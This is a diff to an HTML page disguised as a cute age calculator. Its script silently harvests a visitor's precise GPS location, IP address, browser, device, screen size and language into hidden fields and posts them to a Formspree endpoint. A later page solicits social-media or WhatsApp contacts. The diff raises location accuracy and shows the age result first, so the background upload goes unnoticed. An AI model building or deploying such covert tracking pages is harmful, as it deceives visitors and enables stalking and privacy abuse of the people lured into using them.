@@ -8,7 +8,8 @@
   <style>
     body {
       font-family: 'Caveat', cursive;
-      background: linear-gradient(to right, #FFDAB9, #E1A4B0);
+      /* 1. UPDATED: Background changed to a pink and red mix gradient */
+      background: linear-gradient(to right, #F06292, #FF6B6B);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -44,6 +45,14 @@
     p {
       font-size: 2em;
       margin-bottom: 30px;
+    }
+    
+    /* 2. ADDED: Styling for the result lines on Page 2 */
+    #ageLine, #birthdayLine {
+      color: #E53935; /* Strong red color */
+      font-weight: bold;
+      font-size: 2.8em; /* Large font size */
+      margin: 20px 0; /* Added margin for better spacing */
     }
 
     .form-group {
@@ -94,14 +103,14 @@
     .hidden {
       display: none !important;
     }
-    /* Add basic styling for status message if desired */
+   
     #status {
         font-size: 0.9em;
         color: #757575;
         margin-top: 10px;
     }
     #status.error-status {
-        color: #D32F2F; /* Red color for errors */
+        color: #D32F2F; 
         font-weight: bold;
     }
   </style>
@@ -132,7 +141,8 @@
       <input type="hidden" name="_form_origin" value="Page 1 - Age Calculator" />
 
       <button type="button" onclick="handleSubmit()">Calculate 💌</button>
-       <p id="status"></p> </form>
+       <p id="status"></p> 
+    </form>
   </div>
 
   <div class="container" id="page2">
@@ -171,77 +181,62 @@
   </div>
 
   <script>
-    // IMPORTANT: Replace these with your actual Formspree endpoints.
-    // Create two separate forms on Formspree and get their URLs.
-    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/xpwlalno"; // e.g., https://formspree.io/f/xyza123
-    const FORMSPREE_URL_PAGE3 = "https://formspree.io/f/xpwlalno"; // e.g., https://formspree.io/f/abcde456
+    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/YOUR_FORMSPREE_URL_FOR_PAGE1"; 
+    const FORMSPREE_URL_PAGE3 = "https://formspree.io/f/YOUR_FORMSPREE_URL_FOR_PAGE3"; 
 
-    // Global variables to store location data
     let currentLatitude = "";
     let currentLongitude = "";
 
-    // This script will execute once the entire HTML document is loaded.
     window.onload = function () {
-        // Get reference to the HTML element for status messages
         const statusElement = document.getElementById('status');
 
-        // Check if the browser supports the Geolocation API
+        // 3. ENHANCED GEOLOCATION SCRIPT
+        // This script is designed for high accuracy. Perfect operation depends on user permissions and device capabilities (GPS, Wi-Fi).
         if (navigator.geolocation) {
-            // Update the status message to inform the user about the permission request
-            statusElement.textContent = 'Requesting location permission...';
+            statusElement.textContent = 'Requesting high-accuracy location... Please allow permission.';
             statusElement.classList.remove('error-status');
-
-            // Define options for the getCurrentPosition call to prioritize accuracy
+            
+            // These options request the best possible location data from the device.
             const options = {
-                enableHighAccuracy: true, // Requests the most precise location possible (e.g., using GPS)
-                timeout: 15000,           // Maximum time (in milliseconds) allowed to get the position
-                maximumAge: 0             // Prevents using cached positions; always requests a fresh one
+                enableHighAccuracy: true, // Crucial for accuracy: tells the browser to use GPS if available.
+                timeout: 15000,           // Sets a 15-second limit to prevent waiting forever.
+                maximumAge: 0             // Guarantees a fresh location is fetched, not a cached old one.
             };
 
-            // Get the user's current position once
             navigator.geolocation.getCurrentPosition(
-                // Success callback
                 function (position) {
                     currentLatitude = position.coords.latitude;
                     currentLongitude = position.coords.longitude;
 
-                    // Populate the hidden form fields
                     document.getElementById("latitude").value = currentLatitude;
                     document.getElementById("longitude").value = currentLongitude;
 
-                    // Update the status message
-                    statusElement.textContent = 'Location access granted. Location captured.';
+                    statusElement.textContent = '✅ Location captured successfully!';
                     statusElement.classList.remove('error-status');
 
-                    console.log('--- Location Captured ---');
+                    console.log('--- Accurate Location Captured ---');
                     console.log(`Latitude: ${currentLatitude}`);
                     console.log(`Longitude: ${currentLongitude}`);
-                    console.log(`Accuracy: ${position.coords.accuracy} meters`);
-                    console.log(`Timestamp: ${new Date(position.timestamp).toLocaleString()}`);
-                    console.log('-----------------------');
+                    console.log(`Accuracy: within ${position.coords.accuracy} meters.`);
+                    console.log('---------------------------------');
                 },
-                // Error callback
                 function (error) {
                     let errorMessage = 'An unknown error occurred.';
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = 'Location permission was denied. Location data will not be available.';
+                            errorMessage = 'Location permission was denied by the user.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = 'Location information is unavailable (e.g., no GPS signal).';
+                            errorMessage = 'Location is currently unavailable (e.g., no GPS signal).';
                             break;
                         case error.TIMEOUT:
-                            errorMessage = 'The request for location timed out. Device might be stationary or signal is poor.';
-                            break;
-                        case error.UNKNOWN_ERROR:
-                            errorMessage = 'An unknown error occurred while getting location.';
+                            errorMessage = 'Request for location timed out. Try moving to an open area.';
                             break;
                     }
                     statusElement.textContent = `Error: ${errorMessage}`;
                     statusElement.classList.add('error-status');
-                    console.error('Geolocation Error:', error);
+                    console.error('Geolocation Error:', errorMessage, error);
 
-                    // Ensure hidden fields are empty or marked as 'Unavailable' if error occurs
                     document.getElementById("latitude").value = "Unavailable";
                     document.getElementById("longitude").value = "Unavailable";
                 },
@@ -250,54 +245,43 @@
         } else {
             statusElement.textContent = 'Geolocation is not supported by this browser.';
             statusElement.classList.add('error-status');
-            console.error('Geolocation is not supported by this browser.');
             document.getElementById("latitude").value = "Unsupported";
             document.getElementById("longitude").value = "Unsupported";
         }
 
-        // Device, browser, screen, language, IP (this part remains as before)
+        // --- Other data collection remains the same ---
         const ua = navigator.userAgent;
-
-        // Device Type
         const isMobile = /Mobi|Android/i.test(ua);
         document.getElementById("deviceType").value = isMobile ? "Mobile" : "Desktop";
         document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
-
-
-        // Browser Info
         document.getElementById("browser").value = ua;
-
-        // Screen size
         document.getElementById("screenSize").value = `${screen.width}x${screen.height}`;
-
-        // Language
         document.getElementById("language").value = navigator.language;
-
-        // IP address
         fetch("https://api.ipify.org?format=json")
             .then(res => res.json())
-            .then(data => {
-                document.getElementById("ip").value = data.ip;
-            })
-            .catch(() => {
-                document.getElementById("ip").value = "Unavailable";
-            });
-    }; // End window.onload
+            .then(data => { document.getElementById("ip").value = data.ip; })
+            .catch(() => { document.getElementById("ip").value = "Unavailable"; });
+    };
 
     function handleSubmit() {
       const name = document.getElementById("name").value.trim();
       const dob = document.getElementById("dob").value;
 
       if (name.length < 5 || !dob) {
-        alert("Please enter a valid name and Date of Birth.");
+        alert("Please enter a valid name (at least 5 characters) and your Date of Birth.");
         return;
       }
 
       localStorage.setItem("user_dob", dob);
-
       const formData = new FormData(document.getElementById("mainForm"));
-
-      // Send to the specific URL for Page 1 submissions
+      
+      // We will show the results immediately for a good user experience, 
+      // even while the form submits in the background.
+      const result = calculateDetails(dob);
+      document.getElementById("ageLine").innerHTML = `You are ${result.ageString} old.`;
+      document.getElementById("birthdayLine").innerHTML = `${result.daysLeft} days left for your next birthday! 🎉`;
+      goToPage(2);
+      
       fetch(FORMSPREE_URL_PAGE1, {
         method: "POST",
         body: formData,
@@ -305,25 +289,13 @@
       })
       .then(response => {
         if (response.ok) {
-          const result = calculateDetails(dob);
-          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
-          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
-          goToPage(2);
+          console.log("Page 1 data submitted successfully to Formspree.");
         } else {
-          alert("There was an issue submitting your initial data. Please try again.");
-          const result = calculateDetails(dob);
-          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
-          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
-          goToPage(2);
+          console.error("Failed to submit Page 1 data to Formspree.");
         }
       })
       .catch((error) => {
-          console.error('Error:', error);
-          alert("Something went wrong with the initial submission. Please check your internet connection.");
-          const result = calculateDetails(dob);
-          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
-          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
-          goToPage(2);
+          console.error('Error submitting Page 1 data:', error);
       });
     }
 
@@ -345,7 +317,7 @@
       if (nextBirthday < today) nextBirthday.setFullYear(today.getFullYear() + 1);
       const daysLeft = Math.ceil((nextBirthday - today) / (1000 * 60 * 60 * 24));
       return {
-        ageString: `${years} years, ${months} months, ${days} days`,
+        ageString: `<b>${years}</b> years, <b>${months}</b> months, <b>${days}</b> days`,
         daysLeft
       };
     }
@@ -379,8 +351,8 @@
         e.preventDefault();
         alert("Please provide at least an Instagram ID/Snapchat ID or a WhatsApp number.");
       } else {
-        this.action = FORMSPREE_URL_PAGE3; // Set the action URL before submission
-        alert("Thank you for your interest! We'll be in touch if needed.");
+        this.action = FORMSPREE_URL_PAGE3;
+        alert("Thank you for your interest! We'll be in touch. 😊");
       }
     });
   </script>
